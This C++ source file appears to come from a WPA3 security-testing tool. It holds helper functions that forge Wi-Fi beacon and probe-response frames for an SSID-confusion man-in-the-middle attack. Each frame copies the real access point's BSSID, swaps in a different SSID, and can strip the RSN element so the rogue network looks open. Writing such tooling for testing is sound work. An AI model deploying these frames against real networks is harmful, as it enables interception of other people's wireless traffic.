#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/client_state.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/wifi_util.h"
namespace wpa3_tester {
using namespace Tins;
using namespace std;

Dot11Beacon make_confused_beacon(const Dot11Beacon &real, const string &confused_ssid, const bool strip_rsn) {
	// BSSID kept identical to real AP
	auto b = Dot11Beacon(real.addr1(), real.addr2());
	b.addr3(real.addr3());
	b.timestamp(real.timestamp());
	b.interval(real.interval());
	b.capabilities() = real.capabilities();

	for(const auto &opt: real.options()) {
		if(opt.option() == Dot11::SSID) {
			b.add_option({ Dot11::SSID,
				static_cast<uint8_t>(confused_ssid.size()),
				reinterpret_cast<const uint8_t *>(confused_ssid.data()) });
		} else if(strip_rsn && opt.option() == Dot11::RSN) {
			continue; // drop RSN IE - rogue beacon appears as an open network
		} else {
			b.add_option(opt);
		}
	}
	return b;
}

Dot11ProbeResponse make_confused_probe_resp(
	const Dot11ProbeResponse &real, const string &confused_ssid, const bool strip_rsn) {
	auto resp = Dot11ProbeResponse(real.addr1(), real.addr2());
	resp.addr3(real.addr3());
	resp.timestamp(real.timestamp());
	resp.interval(real.interval());
	resp.capabilities() = real.capabilities();

	for(const auto &opt: real.options()) {
		if(opt.option() == Dot11::SSID) {
			resp.add_option({ Dot11::SSID,
				static_cast<uint8_t>(confused_ssid.size()),
				reinterpret_cast<const uint8_t *>(confused_ssid.data()) });
		} else if(strip_rsn && opt.option() == Dot11::RSN) {
			continue;
		} else {
			resp.add_option(opt);
		}
	}
	return resp;
}
}